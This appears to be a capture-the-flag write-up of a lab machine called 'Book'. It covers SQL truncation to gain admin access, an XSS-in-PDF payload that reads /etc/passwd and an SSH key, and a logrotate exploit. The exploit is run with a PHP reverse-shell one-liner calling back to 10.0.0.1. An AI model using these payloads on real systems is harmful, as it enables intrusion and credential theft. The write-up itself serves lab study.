<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>book</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="styles.css" type="text/css" />
</head>
<body><h1><b><u><img src="{{site.baseurl}}/assets/images/book/book.png" /></u></b></h1>nmap shows only 2 open ports, 22 (ssh) and 80 (http)<br /><br />this is how the site looks like<br /><img src="{{site.baseurl}}/assets/images/book/1-1.png" alt="{{site.baseurl}}/assets/images/book/1-1.png" /><br /><br />so i registered myself an account and logged in. there was a pdf upload available at collections.php<br /><img src="{{site.baseurl}}/assets/images/book/1-2.png" alt="{{site.baseurl}}/assets/images/book/1-2.png" /> <br />and some profile settings at profile.php<br /><img src="{{site.baseurl}}/assets/images/book/1-3.png" alt="{{site.baseurl}}/assets/images/book/1-3.png" /><br /><br />i happend to notice that the name i used to register did not appear completely, which made me think of sql truncation<br /><img src="{{site.baseurl}}/assets/images/book/1-4.png" alt="{{site.baseurl}}/assets/images/book/1-4.png" /><br /><br />sure enough, found this in the source-code of login page<br /><img src="{{site.baseurl}}/assets/images/book/1-5.png" alt="{{site.baseurl}}/assets/images/book/1-5.png" /><br />so i registered myself as an admin via sql truncation<br /><img src="{{site.baseurl}}/assets/images/book/1-6.png" alt="{{site.baseurl}}/assets/images/book/1-6.png" /><br /><br />and gained access to the admin panel which gave me some more functionalities to work with<br /><img src="{{site.baseurl}}/assets/images/book/1-7.png" alt="{{site.baseurl}}/assets/images/book/1-7.png" /><br /><br />collections panel for admin allowed downloading pdfs'. i tried uploading a reverse shell as a pdf, which didnt work but i found something else<br />whatever you wrote in these fields,<br /><img src="{{site.baseurl}}/assets/images/book/1-8.png" alt="{{site.baseurl}}/assets/images/book/1-8.png" /><br /><br />ended up in the pdf<br /><img src="{{site.baseurl}}/assets/images/book/1-9.png" alt="{{site.baseurl}}/assets/images/book/1-9.png" /><br /><br />so maybe i can download some files from the server? quick google led me to this incredible <a href="https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html">XSS based LFI</a><br />i used the same payload as described in that writeup<br /><br /><div class="codebox"><div class="codebox">&lt;script&gt;<br />x=<span style="color:#ff9d00;font-weight:700">new</span>&nbsp;XMLHttpRequest;<br />x.onload=<span style="color:#ff9d00;font-weight:700">function</span>(){<br />&nbsp;&nbsp;&nbsp;&nbsp;document.write(<span style="color:#ff9d00;font-weight:700">this</span>.responseText)};<br />&nbsp;&nbsp;&nbsp;&nbsp;x.open(<span style="color:#3ad900;font-weight:400">"GET"</span>,<span style="color:#3ad900;font-weight:400">"file:///etc/passwd"</span>);<br />&nbsp;&nbsp;&nbsp;&nbsp;x.send();<br />&lt;/script&gt;<br /></div></div><br /><br />and that worked! and i got a username: reader. so next i tried to see if i could get a ssh private key and luckily, there was one present<br /><img src="{{site.baseurl}}/assets/images/book/1-10.png" alt="{{site.baseurl}}/assets/images/book/1-10.png" /><br /><br />but the characters werent properly visible in the pdf so copying the contents directly would not work. insted use pdfminer, get the key and ssh into the box to own user<br /><img src="{{site.baseurl}}/assets/images/book/1-11.png" alt="{{site.baseurl}}/assets/images/book/1-11.png" /><br /><br />next i ran some usual enumeration and pspy showed me the way to root<br /><img src="{{site.baseurl}}/assets/images/book/1-12.png" alt="{{site.baseurl}}/assets/images/book/1-12.png" /><br /><br />googled exploits for logrotate and found this <a href="https://github.com/whotwagner/logrotten">exploit</a> on github<br /><br />(the exploit requires us to create a reverse shell payload, the one specified in the exploit didnt work<br />so i changed payloads, tried bash, python both of which didnt work<br />finally struck it with php one liner)<br /><br />create the payload file:<br /><br /><div class="codebox"><div class="codebox">php&nbsp;-r&nbsp;<span style="color:#3ad900;font-weight:400">'$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh&nbsp;-i&nbsp;&lt;&amp;3&nbsp;&gt;&amp;3&nbsp;2&gt;&amp;3");'</span></div></div><br /><br />and execute the exploit<br /><img src="{{site.baseurl}}/assets/images/book/1-13.png" alt="{{site.baseurl}}/assets/images/book/1-13.png" /><br />(the renamed part appears after the payload is triggered)<br />and trigger it<br /><img src="{{site.baseurl}}/assets/images/book/1-14.png" alt="{{site.baseurl}}/assets/images/book/1-14.png" /><br /><br />and we get a revershell, which is quite short lived. :/<br />i tried to see if there was a private key for root available and sure enough there was one, the temporary shell gave me enough time to cat that<br />ssh in to own root<br /><img src="{{site.baseurl}}/assets/images/book/1-15.png" alt="{{site.baseurl}}/assets/images/book/1-15.png" /><br /><br /><br /></body></html>